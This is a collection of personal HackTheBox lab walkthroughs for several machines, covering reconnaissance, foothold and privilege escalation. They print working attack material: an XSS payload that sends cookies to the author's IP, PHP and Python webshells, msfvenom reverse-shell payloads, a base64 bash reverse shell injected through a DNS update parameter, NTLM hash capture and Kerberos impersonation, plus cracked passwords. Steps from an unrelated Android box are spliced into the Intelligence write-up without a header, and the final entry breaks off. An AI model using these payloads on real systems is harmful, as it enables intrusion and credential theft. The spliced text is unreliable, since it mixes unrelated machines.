item.title: The Notebook - HackTheBox machine
item.description: Foothold 1- Nmap finds open ports 22 and 80, filtered port 10010/tcp filtered rxapi. 2- Web is a notekeeper CRUD website. On the login page, I found that I can enumerate usernames because it tells me the reason auth failed: there is a user called ‘admin’. 3- Register an account, and look at the cookies: auth and uuid. Auth cookie seems a JWT token. Decode and find: Header: { “typ”: “JWT”, “alg”: “RS256”, “kid”: “http://localhost:7070/privKey.
item.content:
Foothold

1- Nmap finds open ports 22 and 80, filtered port 10010/tcp filtered rxapi.

2- Web is a notekeeper CRUD website. On the login page, I found that I can enumerate usernames because it tells me the reason auth failed: there is a user called ‘admin’.

3- Register an account, and look at the cookies: auth and uuid. Auth cookie seems a JWT token. Decode and find:

Header: { “typ”: “JWT”, “alg”: “RS256”, “kid”: “http://localhost:7070/privKey.key” <- private key } Payload: { “username”: “anna”, “email”: “anna@gmail.com”, “admin_cap”: 0 <– change to 1 }

4- So I need access to the private key. Or I can change the ‘kid’ field to my own IP.

openssl genrsa -out privKey.key 4028 python3 -m http.server 7070

5- There are interesting notes in Admin panel.

  • Need to fix config. PHP can be executed.
  • There are backup tasks.
  • There is a user named noah.

6- Upload a PHP pw0ny shell and view it to remote code execution.

7- Download backup of home tarball and use the .ssh id_rsa to ssh into noah session. -> user.txt get!

Privilege escalation

8- sudo -l to find access to sudo docker exec -it webapp-dev01 ANY COMMAND

9- Use this PoC CVE-2019-5736 in main.go to get a reverse shell from root.

item.title: Seal - HackTheBox machine
item.description: Rank: medium Part of this article is encrypted with password: --- DON'T MODIFY THIS LINE --- Foothold 1- Nmap found 8080 (http proxy), 22 (ssh), 443 (http nginx) 2- After visiting seal.htb:8080 redirects to http://seal.htb:8080/signin;jsessionid=node01tjyqiz7gjnlz10tpoes47xr1g88.node0?redirect=%2F Set-Cookie: JSESSIONID=node0eechasxnr4hcp25y400b85jc53.node0; node0 is repeated. 401 Unauthorized. jsessionid cookie is passed in the url, redirect param is ‘/’. 3- Register an account in Gitbucket and access the source code of the webapp.
item.content:
• Rank: medium

Part of this article is encrypted with password:

--- DON'T MODIFY THIS LINE ---

Foothold

1- Nmap found 8080 (http proxy), 22 (ssh), 443 (http nginx)

2- After visiting seal.htb:8080 redirects to http://seal.htb:8080/signin;jsessionid=node01tjyqiz7gjnlz10tpoes47xr1g88.node0?redirect=%2F

Set-Cookie: JSESSIONID=node0eechasxnr4hcp25y400b85jc53.node0; node0 is repeated. 401 Unauthorized.

jsessionid cookie is passed in the url, redirect param is ‘/’.

3- Register an account in Gitbucket and access the source code of the webapp. There are three directories: app, tomcat, nginx. The TODO list mentions: 3.1- Remove mutual authentication for dashboard, setup registration and login features. <– what is mutual auth? 3.2- Deploy updated Tomcat confs. <– look at what updates are pending in the commit diff files. in tomcat-users.xml 3.3- Disable manager and host-manager. <– what is this?

4- Read about Tomcat. Tomcat has a web interface to manage webapps and deployment, which by default can be accessed at /manager/html. Only tomcat users which have manager-gui role have access.

5- /manager/html returns 403 Forbidden by nginx. This is due to whitelisting. A bypass to this is directory path traversal. This blog explains how java applications suffer from path normalization vulnerability. https://thehackingfactory.com/dot-dot-semicolon-rce

See nginx/sites-enables/default: /manager/html, /host-manager/html, /admin/dashboard require ssl_client_verify to be SUCCESS, but we don’t have the client certificate. We can bypass the list with /manager/anything;/..;/html. Nginx sees /manager/anything;/..;/html, but Tomcat sees /manager/anything/../html.

6- Deploy meterpreter reverse shell WAR file. msfvenom -p java/meterpreter/reverse_tcp LHOST=tun0 LPORT=1234 -f war -o health.war Catch POST packet in Burpsuite and change the url path to bypass the client certificate check by nginx.

7- Metasploit listen to port 1234. Visit /health.

8- getuid reveals we are user tomcat. There is a folder named ‘luis’ in /home folder. tomcat user doesn’t have permissions to read user.txt nor .ssh/id_rsa. The existence of .ansible directory hints that there may be some backup task. Explore /opt to find backups/. backups/ –> archives/ –> backup-xxx-xxx.gz –> playbook/ –> run.yml

We cannot modify run.yml.

8- In run.yml, we can exploit copy_links=yes. ln -s /home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/id_rsa cp archives/backup-THE-MOST-RECENT-ONE.gz /tmp Download the gz file. file reveals it’s a tar gz file –> tar xvfz backup.tar.gz –> dashboard/ –> see uploads/id_rsa

9- ssh -i id_rsa luis@seal.htb

Privilege escalation

  • sudo -l

  • See https://gtfobins.github.io/gtfobins/ansible-playbook/. It’s very straighforward since ansible playbook is an automation tool which can run any command.

item.title: Schooled - HackTheBox machine
item.description: Rank: medium Foothold 1- nmap discovered 22, 80, 33060 (mysqlx) 2- Web clues: contact.php -> 404 email: admissions@schooled.htb web address schooled.htb -> suggests there can be subdomains 3- wfuzz -c -u “http://schooled.htb/" -H “Host:FUZZ.schooled.htb” -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt –hl 461 (Hide those whose line is 461). Found moodle.schooled.htb. 4- Self enroll in Maths. Read announcements. The teacher Manuel Philips will check himself when we set the MoodleNet profile.
item.content:
• Rank: medium

Foothold

1- nmap discovered 22, 80, 33060 (mysqlx)

2- Web clues:

  • contact.php -> 404
  • email: admissions@schooled.htb
  • web address schooled.htb -> suggests there can be subdomains

3- wfuzz -c -u “http://schooled.htb/" -H “Host:FUZZ.schooled.htb” -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt –hl 461 (Hide those whose line is 461).

Found moodle.schooled.htb.

4- Self enroll in Maths. Read announcements. The teacher Manuel Philips will check himself when we set the MoodleNet profile.

5- Check for XSS in every input (description, chat). Steal the cookie to access higher role (Teacher role). Wait for a long time… Because the teacher will check for our profile, set the MoodleNet to

<script>var i=new Image;i.src="http://10.10.14.23:8888/?"+document.cookie;</script>

Description is not vulnerable.

10.10.10.234 - - [02/Aug/2021 10:48:40] “GET /?MoodleSession=g6913p6t2kegeg9n1dgee9qm12 HTTP/1.1” 200 -

6- CVE-2020-14321. This vulnerability allows Course enrolments to allow privilege escalation from teacher role into manager role.

Burpsuite when enrolling a new user. Change userlist param to current account id (24?) and set roletoassign to 1 (manager).

7- As Liann Carter, go to Site administration page at http://moodle.schooled.htb/moodle/admin/search.php.

Moodle 3.9 (Build: 20200615).

// 8- Go to Users / Edit roles / Manager / Edit / Save changes –> use burpsuite to change everything to 1 (allowed).

9- Go to Plugins / Install plugins / submit rce.zip and install.

// 10- Visit http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php to activate the webshell.

11- Relay a reverse shell with pentestmonket php reverse shell as www-data user.

12- Cat the apache config to get MySQL credentials.

find / -name ‘config.php’ 2>/dev/null –> /usr/local/www/apache24/data/moodle/config.php

13- Connect to mysql and retrieve all credentials for moodle.

find / -name mysql 2>/dev/null –> /usr/local/bin/mysql /usr/local/bin/mysql -u moodle –password=PlaybookMaster2020 -e ‘use moodle; show tables;’ –> found mdl_user /usr/local/bin/mysql -u moodle –password=PlaybookMaster2020 -e ‘use moodle; select * from mdl_user;’ –> jamie password hash is $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW –> higgins jane -> $2y$10$n9SrsMwmiU.egHN60RleAOauTK2XShvjsCS0tAR6m54hR1Bba6ni2 –> manuel philips -> $2y$10$ZwxEs65Q0gO8rN8zpVGU2eYDvAoVmWYYEhHBPovIHr8HZGBvEYEYG –> carter lianne -> $2y$10$jw.KgN/SIpG2MAKvW8qdiub67JD7STqIER1VeRvAH4fs/DPF57JZe

14- John crack the credentials.

john –wordlist=/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt tocrack.txt

15- SSH into jamie:!QAZ2wsx

Privilege escalation

1- sudo -l to find pkg update and pkg install * 2- Create a custom package that sets the SETUID bit in /bin/bash. See pkg_install.sh. 3- bash -p (this option exploits the SETUID bit if set).

item.title: Pit - HackTheBox machine
item.description: Rank: medium Part of this article is encrypted with password: --- DON'T MODIFY THIS LINE --- Foothold 1- Nmap discovered 22, 80, 9090. Port 9090 is an http port for remote connection to CentOS. We have to log in with in the server user account. From ssl port I retrieved the commonName dms-pit.htb. 9090 seems to be zeus-admin service. I really shouldn’t ignore UDP ports in a pentest… DNS, SNMP, and DHCP (registered ports 53, 161/162, and 67/68) are juicy ports.
item.content:
• Rank: medium

Part of this article is encrypted with password:

--- DON'T MODIFY THIS LINE ---

Foothold

1- Nmap discovered 22, 80, 9090. Port 9090 is an http port for remote connection to CentOS. We have to log in with in the server user account. From ssl port I retrieved the commonName dms-pit.htb. 9090 seems to be zeus-admin service.

I really shouldn’t ignore UDP ports in a pentest… DNS, SNMP, and DHCP (registered ports 53, 161/162, and 67/68) are juicy ports. Nmap udp ports to check for SNMP, DNS or DHCP.

nmap -sU -sV -v -oA udpnmap pit.htb

2- Web enumeration:

nikto -h pit.htb
# --> Nginx 1.14.1 from Red Hat Enterprise. 
nikto -h pit.htb:9090
# --> No server headers.

http://pit.htb:80 is a Nginx welcome page.

http://pit.htb:9090 is a web system management console, CentOS cockpit (google it)

https://dms-pit.htb is Forbidden 403

https://dms-pit.htb:9090 is the cockpit login page again

Run some fuzzing in the background.

ffuf -c -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://dms-pit.htb/FUZZ -fc 403
# --> Nothing

ffuf -c -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://dms-pit.htb:9090/FUZZ -fs 43548,0,73
# --> /ping

/ping returns JSON { “service”: “cockpit” }

3- Check public community string for SNMP.

snmp-check 10.10.10.241 -p public –> list of processes, no interesting processes snmpwalk -v 1 -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendOutputFull > snmpwalk.txt snmpwalk -v 1 -c public 10.10.10.241 .1 > snmpwalk-all.txt –> Via manual inspection (vim snmpwalk-all.txt), I found an interesting path: /var/www/html/seeddms51x/seeddms and /usr/bin/monitor. And usernames michelle and root.

4- SSH with michelle:michelle but SSH requires public key authentication, sad :(.

5- Add path /seeddms51x/seeddms to all combinations of hostname and port. Found a DMS login at https://dms-pit.htb/seeddms51x/seeddms. Login with michelle:michelle.

  • It runs Seed DMS.
  • There is an upgrade notice that reveals that the Seed DMS is version 5.1.15.
  • There is a Docs folder with two user folders: Michelle and Jack.

The CHANGELOG did mention that there is a security issue. This line:

  • fix for CVE-2019-12744 (Remote Command Execution through unvalidated file upload)

6- Cannot login with hand crafted credentials to CentOS cockpit console.

7- I am confused. Try to exploit CVE-2019-12744 although the admin should have fixed it according to the CHANGELOG.

Upload 1.php and access it through http://dms-pit.htb/seeddms51x/data/1048576/32/1.php?cmd=cat+/etc/passwd. Actually, the path is /data/1048576/<documentid>/<version>.<extension>. So I wrote a python webshell: seeddmswebshell.py

python3 seeddmswebshell.py -u 'http://dms-pit.htb/seeddms51x/data/1048576/32/1.php?cmd='
id
# uid=992(nginx) gid=988(nginx) groups=988(nginx) context=system_u:system_r:httpd_t:s0
ls /var/www/html/seeddms51x/conf
cat /var/www/html/seeddms51x/conf/settings.xml # (see saved settings.xml)

1.php:

<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

seeddmswebshell.py

#!/usr/bin/python3

from cmd import Cmd
import sys, requests

class Webshell(Cmd):
    def __init__(self, url):
        super().__init__()
        self.prompt = '(seeddms)'
        self.intro = 'Be quick! It\'s not very stable...'
        self.url = url
        self.session = requests.Session()
        
    def default(self, line):
        print(f"Making a GET request to {url}")
        payload = {'cmd': line}
        res = self.session.get(url, params=payload)
        print(res.text)
        
    def do_exit(self, arg):
        return True
    
if __name__ == '__main__':
    if len(sys.argv) < 2 or not 'http' in sys.argv[1]:
        print('Usage: python3 seeddmswebshell.py \'http://dms-pit.htb/seeddms51x/data/1048576/32/1.php\'')
    url = sys.argv[1]
    Webshell(url).cmdloop()

8- There are db creds in settings.xml:

dbDatabase="seeddms" dbUser="seeddms" dbPass="ied^ieY6xoquu"

Try to connect to CentOS cockpit with these creds but failed. Use michelle:ied^ieY6xoquu to

Privilege escalation

9- Run linpeas.

10- Explore /usr/bin/monitor found earlier.

#!/bin/bash

for script in /usr/local/monitoring/check*sh
do
    /bin/bash $script
done

Check /usr/local/monitoring.

ls -l /usr/local/monitoring
# --> Permission denied.
getfacl /usr/local/monitoring
getfacl: Removing leading '/' from absolute path names
# file: usr/local/monitoring
# owner: root
# group: root
user::rwx
user:michelle:-wx
group::rwx
mask::rwx
other::---

michelle can place a script at /usr/local/monitoring which gets executed when SNMP is triggered:

snmpwalk -m +MY-MIB -v2c -c public 10.10.10.241 nsExtendObjects

Write to /usr/local/monitoring:

cat <<EOF > /usr/local/monitoring/check_fw.sh
#!/bin/bash 
cp /root/root.txt /tmp/hash.txt
EOF

For some reason, I get permission denied. Why can’t root write to /tmp???

11- Change the check_fw.sh to put my public key at /root/.ssh/authorized_keys.

Generate my public key:

ssh-keygen -t rsa

The new check_fw.sh is:

echo "PUBLIC_KEY" > /root/.ssh/authorized_keys

Trigger snmp again:

snmpwalk -m +MY-MIB -v2c -c public 10.10.10.241 nsExtendObjects

ssh -i root root@pit.htb

item.title: Love - HackTheBox machine
item.description: Rank: easy Foothold 1-Usual sudo nmap -sC -sV -oA nmap target to discover ports 80, 443, 135, 139, 445, 5000. I take note of the Apache version and box version Windows 10 Pro 19042. There is also a 3306 port for mysql MariaDB, which says that my IP is not allowed to connect to the DB (Agggh, IP restriction). 2- I can deduce that the box offers services http, https, MS samba, mysql and an unknown service 5000.
item.content:
• Rank: easy

Foothold

1-Usual sudo nmap -sC -sV -oA nmap target to discover ports 80, 443, 135, 139, 445, 5000. I take note of the Apache version and box version Windows 10 Pro 19042. There is also a 3306 port for mysql MariaDB, which says that my IP is not allowed to connect to the DB (Agggh, IP restriction).

2- I can deduce that the box offers services http, https, MS samba, mysql and an unknown service 5000. The port 5000 service returns 403 Forbidden, probably due to IP restriction. 443 port responds with 403 Forbidden but the ssl-cert reveals a commonName = staging.love.htb

3- The pivot points left are the Windows version itself (found Unified Remote 3.9.0.2463, not useful here), Apache 2.4.46 (no exploits found except Optionsbleed, not useful here), web on target and staging.love.htb and samba (I am not experienced enough for now).

4- Open http://target and http://staging.love.htb on browser. Target is a login form for a voting system using PHP, the second one is a webpage to scan urls.

5- Search for exploits for the software of the voting system in exploitDB. There are two, sqli in the login form and rce when logged in as admin. Also found the source code of the software.

6- Tried the default admin credentials written in the software docs. No luck. Tried the sqli with Burpsuite, no luck.

7- Insert http://localhost:5000 in the file url scanner. GOT the admin credentials!

8- Now having admin account, we can utilise the rce exploit.

msfvenom -p php/meterpreter_reverse_shell -f php LHOST=10.10.14.44 LPORT=1234 > shell.php # Could have used a stealthier name hhhh
msfconsole use exploit/multi/handler

9- Upload in candidates.php and get a shell. Php shells are not stable, cannot even cd to another dir :(. Use meterpreter to upload an EXE.

msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe LHOST and LPORT > update.exe

10- Cannot execute the EXE directly, so let’s upload another PHP with the command shell_exec(‘update.exe’);. See anna.php:

<?php
  shell_exec('shell.exe');
?>

11- Now we get a stable user shell!

Privilege escalation

12- Definitely smth I need is an automatic checker of common privesc misconfigurations, such as WinPEAS. I tried getsystem with no luck. Use metasploit.

msfconsole -q
use exploit/windows/local/always_install_elevated 
set session 1 
set LHOST xxxxx
exploit

13- GOT NT AUTHORITY/SYSTEM shell.

item.title: Knife - HackTheBox machine
item.description: Rank: easy Foothold Nmap to find ports 22 and 80. There seems to be no exploit from Apache and OpenSSH versions. Inspect the HTML and the web request. Use nikto to scan. Found PHP version 8 dev, for which there is an exploit in ExploitDB. Get user shell using the backdoor PHP exploit. Privilege escalation sudo -l to find knife. knife can execute ruby script, so: sudo knife exec -E 'exec "/bin/bash"' Note that we didn’t use SSH.
item.content:
• Rank: easy

Foothold

  1. Nmap to find ports 22 and 80. There seems to be no exploit from Apache and OpenSSH versions.
  2. Inspect the HTML and the web request. Use nikto to scan. Found PHP version 8 dev, for which there is an exploit in ExploitDB.
  3. Get user shell using the backdoor PHP exploit.

Privilege escalation

  1. sudo -l to find knife. knife can execute ruby script, so:
sudo knife exec -E 'exec "/bin/bash"'

Note that we didn’t use SSH. Another potential solution would be to bruteforce the SSH connection.

item.title: Intelligence - HackTheBox machine
item.description: Rank: medium Part of this article is encrypted with password: --- DON'T MODIFY THIS LINE --- Foothold 1- Nmap: 53 -> dns 139 -> netbios 445 -> smb 135 -> rpc 593 -> ncacn http, rpc 5985 -> winrm 389, 636, 3268, 3269 -> LDAP, Active Directory is on 88 -> Kerberos, it is a domain controller 464 -> kpasswd5, kerberos password change, not interesting 80 -> web server IIS 10.
item.content:
• Rank: medium

Part of this article is encrypted with password:

--- DON'T MODIFY THIS LINE ---

Foothold

1- Nmap: 53 -> dns 139 -> netbios 445 -> smb 135 -> rpc 593 -> ncacn http, rpc 5985 -> winrm 389, 636, 3268, 3269 -> LDAP, Active Directory is on 88 -> Kerberos, it is a domain controller 464 -> kpasswd5, kerberos password change, not interesting 80 -> web server IIS 10.0 5985 -> Microsoft HTTPAPI, not interesting 9389 -> .NET Message Framing (?)

Services: samba suite (smbclient, rpcclient), evil-winrm, web, ldap,

SMB signing is required.

CN=dc.intelligence.htb

2- SMB and RPC null session and anonymous session. Successful but no privileges.

smbclient -N -U "" -L \\intelligence.htb # (and without -U) 
rpcclient -N -U "" -L intelligence.htb # (and without -U)

3- LDAP enumeration. Permission denied.

4- Web enumeration. Contact form is useless. There are 2 PDFs in /documents folder. Name is YYYY-MM-DD-upload.pdf. Scrape them from 2020-01-01 to 2020-12-15. Here is the script I wrote:

#!/usr/bin/python3 
# scrapePdfs.py
import requests
import os

# Convert int to str and pad with 0 if single digit.
def padstr(n: int) -> str:
    if n < 10:
        return '0' + str(n)
    else:
        return str(n)

# Download document and save to current directory. 
def download(month: int, day: int) -> None:
    url = "http://intelligence.htb/documents/"
    filename = f"2020-{padstr(month)}-{padstr(day)}-upload.pdf"
    # wget and save, if 
    r = requests.get(url + filename, allow_redirects=True) 
    if r.status_code != 200:
        raise Exception('File not found')
    else: 
        with open(filename, 'wb') as f:
            f.write(r.content)
    

def main():
    for m in range(1, 13, 1):
        for d in range(1, 32, 1):
            try:
                download(m, d)
            except:
                print(f"No file at {padstr(m)}-{padstr(d)}")

if __name__ == '__main__':
    main()

Find differences in content with pdfcontentdump.py (or go through the content manually). Here is my script to convert pdf to text and combine them to a txt file.

#!/usr/bin/python3

import io
import sys

from pdfminer.pdfinterp import PDFResourceManager
from pdfminer.layout import LAParams
from pdfminer.converter import TextConverter
from pdfminer.pdfinterp import PDFPageInterpreter
from pdfminer.pdfpage import PDFPage

def pdf_to_text(path):
    with open(path, 'rb') as fp:
        rsrcmgr = PDFResourceManager()
        outfp = io.StringIO()
        laparams = LAParams()
        device = TextConverter(rsrcmgr, outfp, laparams=laparams)
        interpreter = PDFPageInterpreter(rsrcmgr, device)
        for page in PDFPage.get_pages(fp):
            interpreter.process_page(page)
    text = outfp.getvalue()
    return text

def main():
    outfile = 'combinedContent.txt'
    content = ''
    for fname in sys.argv[1:]:
        content += pdf_to_text(fname)
    # save to outfile
    with open(outfile, 'w') as f:
        f.write(content)

if __name__ == '__main__':
    main()

There is a PDF with new account default password (06-04):

NewIntelligenceCorpUser9876

Searching for common words (like ‘the’), I found another interesting piece of text:

Internal IT Update

There has recently been some outages on our [web servers]. [Ted] has gotten a
[script] in place to help notify us if this happens again.
Also, after discussion following our recent security audit we are in the process
of locking down our [service accounts].

5- From PDFs, extract the potential usernames: scrapeUsers.py. The unique names are at userlist.txt. What I can do is to strip the lastname, toggle capital letters, change dot to underscore.

#!/usr/bin/python3

import sys 
import exiftool

def main():
    files = sys.argv[1:]
    with exiftool.ExifTool() as et:
        metadata = et.get_metadata_batch(files)
    for d in metadata:
        print(d['PDF:Creator'])


if __name__ == '__main__':
    main()

6- Password spraying with default password:

crackmapexec smb intelligence.htb -u userlist.txt -p "NewIntelligenceCorpUser9876"

SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876

Tiffany.Molina:NewIntelligenceCorpUser9876

7- SMB server via smbclient: Sharename Type Comment â ——— —- ——- â ADMIN$ Disk Remote Admin â C$ Disk Default share â IPC$ IPC Remote IPC â IT Disk â NETLOGON Disk Logon server share â SYSVOL Disk Logon server share â Users Disk

Tiffany cannot access C$, ADMIN$. From Users folder, we can see there is another user named Ted.Graves, who doesn’t have the default password. In IT folder, there is a downdetector.ps1 script.

9- Use crackmapexec to retrieve hashes from memory using –sam. No success.

10- Enumerate all services in AD by ldapsearch, this time with credentials: ldapsearch -h intelligence.htb -x -D “cn=Tiffany.Molina,cn=Users,dc=intelligence,dc=htb” -w NewIntelligenceCorpUser9876 servicePrincipalName. No success, invalid credentials.

11- Read downdetector.ps1. It is the script that the Internal IT document mentioned. It is scheduled to run every 5 minutes. If there is a domain starting with ‘web’, send a request with default credentials, probably from Ted. Let’s trigger it by adding a DNS record starting with ‘web’ and catch the default credentials of Ted.

This is downdetector.ps1.

# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}

And here we add a DNS record with Tiffany credentials.

python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -a add -r 'weboops.intelligence.htb' -d 10.10.14.93 10.10.10.248 (where 10.10.10.248 is the IP of the LDAP server)

Listen for NTLM connection.

responder -I tun0 -A

[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:cb633911f6b526fe:79E28A59A0F79CEE88340066FF707585:

12- Sadly we cannot convert NTLMv2 hash to NTLM hash to perform PtH attacks. What we can do is either NTLM relay or crack the hash.

ntlmrelayx # Haven't read about ntlm relay internals. I need to study it. 

hashcat -m 5600 ted_ntlmv2.txt /usr/share/wordlists/rockyou.txt -O # --> Mr.Teddy

Where ted_ntlmv2.txt is

Ted.Graves::intelligence:cb633911f6b526fe:79E28A59A0F79CEE88340066FF707585:

13- Run bloodhound via winrm. WinRMAuthorizationError for both Ted and Tiffany. Try psexec.

evil-winrm -e htb/machines/intelligence/privesc -i intelligence.htb -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' 

psexec.py intelligence.htb/Ted.Graves@dc.intelligence.htb # Shares aren't writable by Ted.

14- Use Ted and Tiffany creds to gMSADumper and lapsdumper in search for hashes. lapsdumper does not reveal anything (no permissions).

python3 gMSADumper.py -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -d intelligence.htb
python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d intelligence.htb

> DC$
> itsupport
svc_int$:::5e47bac787e5e1970cf9acdb5b316239

15- Try to get the service ticket and perform Pass The Ticket (PTT) attack.

python3 getST.py intelligence.htb/scv_int$ -spn WWW/dc.intelligence.htb -hashes :5e47bac787e5e1970cf9acdb5b316239 -impersonate administrator

[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

If you find this error from Linux: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) it’s because of your local time, you need to synchronise the host with the DC: ntpdate <IP of DC>

ntpdate intelligence.htb
python3 getST.py intelligence.htb/scv_int$ -spn WWW/dc.intelligence.htb -hashes :5e47bac787e5e1970cf9acdb5b316239 -impersonate administrator

16- Load the ccache ticket by setting the KRB5CCNAME environment variable to the ticket path. Then access SMB using the ticket.

export KRB5CCNAME=/path/to/administrator.ccache

smbclient.py -k -no-pass -dc-ip intelligence.htb -target-ip intelligence.htb intelligence.htb/Administrator@dc.intelligence.htb

> use C$
> cd Users/Administrator/Desktop
> get root.txt

OR mount C$??? But failed with STATUS_SHARING_VIOLATION. OR psexec.py

psexec.py -k -no-pass intelligence.htb/Administrator@dc.intelligence.htb

root: 676a7f4d669819b40d5d8ef5aadb6f5c

2- ES File explorer metasploit exploit auxiliary/scanner/http/es_file… to get pictures and look for creds.

3- The creds in creds.jpg is probably the creds for ssh tcp/2222.

   username: kristi
   password: Kr1sT!5h@Rp3xPl0r3!

Privilege escalation

4- tcp 5555 freeciv exploit. Android Debug Bridge freeciv exploit. This is a python script which is basically the solution: ssh local port forwarding: connect to remote 5555 via 2222 ssh link.

import socket # socket
import subprocess  # Subprocess
import pyautogui  # PyAutoGui
import time  # Time


def connection_function(host, port):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((host, port))
  print(s.recv(1024))

connection_function("10.10.10.247", 2222)


def adb_connection(host, port):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((host, port))
  print(s.recv(1024))

  subprocess.call(['ssh -p 2222 -L 5555:localhost:5555 kristi@target'], shell=True)
  password = "Kr1sT!5h@Rp3xPl0r3!" # this isn't used though
  print(s.recv(1024))
  
adb_connection("10.10.10.247", 2222)

item.title: Dynstr - HackTheBox machine
item.content:
• Rank: medium

Part of this article is encrypted with password:

--- DON'T MODIFY THIS LINE ---

Foothold

1- Nmap discovered ports 22, 80, 53.

80 -> Apache/2.4.41 53 -> ISC BIND 9.16.1

# Nmap 7.91 scan initiated Wed Sep  1 19:36:11 2021 as: nmap -sC -sV -p- -v -oA tcp dynstr.htb
Nmap scan report for dynstr.htb (10.10.10.244)
Host is up (0.090s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)
|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)
|_  256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dyna DNS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep  1 19:41:49 2021 -- 1 IP address (1 host up) scanned in 337.88 seconds

2- Web recon. –> The company Dyna offers dynamic DNS services just as no-ip.com API –> It has domains: dnsalias.htb, dynamicdns.htb, no-ip.htb –> credentials: dynadns:sndanyd –> email: dns@dyna.htb

I’ll add dyna.htb to /etc/hosts.

Fuzz in the background.

ffuf -c -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://dyna.htb/FUZZ -fc 403

Found /nic.

3- DNS zone transfer failed.

dig axfr @dynstr.htb 
dig axfr @dynstr.htb dnsalias.htb
# --> Transfer failed.

Try playing with DNS with nslookup and query the 3 found domains: no answer. Try dig.

dig ANY @dynstr.htb dnsalias.htb dnsalias.htb. 60 IN SOA dns1.dyna.htb. hostmaster.dyna.htb. 2021030300 21600 3600 604800 60
dnsalias.htb. 60 IN NS dns1.dyna.htb. dig ANY @dynstr.htb no-ip.htb Same answer. dig ANY @dynstr.htb dynamicdns.htb Same answer.

hostmaster@dyna.htb is the DNS admin email. dns1.dyna.htb points to 127.0.0.1. This is a dead end.

4- Remember the no-ip.com API and the credentials from the web recon phase? I googled about the no-ip.com API. The first page gives an example of the update API:

http://username:password@dynupdate.no-ip.com/nic/update?hostname=mytest.example.com&myip=192.0.2.25

GET /nic/update?hostname=mytest.example.com&myip=192.0.2.25 HTTP/1.1
Host: dynupdate.no-ip.com
Authorization: Basic base64-encoded-auth-string
User-Agent: Company DeviceName-Model/FirmwareVersionNumber maintainer-contact@example.com

Where the auth string is base64 encoded username:password.

Fuzz this API and look for command injection (sql injection is unlikely).

Use Burpsuite to do manual fuzzing first:

GET /nic/update?hostname=%3bdynamicdns.no-ip.htb&myip=192.0.2.25 HTTP/1.1 # <--- Here I used dynamicdns.no-ip.htb because single domains give 911 wrong domain error, I used %3b because that's ";"
Authorization: Basic ZHluYWRuczpzbmRhbnlk

returns 911 [nsupdate failed].

5- Research nsupdate to get a feeling of how the command call is made. Urlencode this and send it to burpsuite repeater:

hostname=`echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNS80MjQyIDA+JjE= | base64 -d | bash` anything.no-ip.htb

while listening to 4242.

whoami
# www-data

cat /etc/passwd
# There are users bindmgr and dyna.

6- List /home/dyna and /home/bindmgr. There is a setuid bash with owner bindmgr, just run bash with euid:

./bash -p
cat user.txt

It turns out the setuid bash is a leftover of other players. Read step 7 first. The correct way is to use nsupdate to point some DNS record to our IP and then ssh with private key.

nsupdate -k infra.key
> update add sftp.infra.dyna.htb 86400 A ATTACKER_IP
> update add REVERSED_ATTACKER_IP.in-addr.arpa 300 PTR anything.infra.dyna.htb
> send

ssh -i bindmgr bindmgr@dynstr.htb

And we get user.txt.

Privilege escalation

7- Inspect /home/bindmgr and find (amidst a lot of garbage):

